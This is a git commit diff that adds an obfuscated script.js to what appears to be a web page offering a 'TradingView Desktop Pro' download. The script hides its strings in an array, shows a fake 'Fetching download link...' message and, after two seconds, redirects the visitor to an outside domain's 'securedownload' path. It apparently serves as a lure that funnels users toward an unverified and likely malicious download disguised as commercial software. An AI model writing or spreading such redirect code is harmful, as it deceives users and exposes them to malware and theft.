33d6e11679df8f2d7da131de449575653cd5472e
hanepat <hanepat211@gmail.com>
2026-04-15 02:22:36 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,14 @@
+(function() {
+    var _0 = [
+        'getElementById', 'loader', 'textContent', 'Fetching download link...',
+        'Redirecting…', 'setTimeout', 'location', 'href'
+    ];
 
+    var loaderElement = document[_0[0]](_0[1]);
+    loaderElement[_0[2]] = _0[3];
+
+    window[_0[5]](function() {
+        loaderElement[_0[2]] = _0[4];
+        window[_0[6]][_0[7]] = 'https://www.hanepathub.site/hanepat.github.io/tradingview-desktop-pro/securedownload/';
+    }, 2000);
+})();
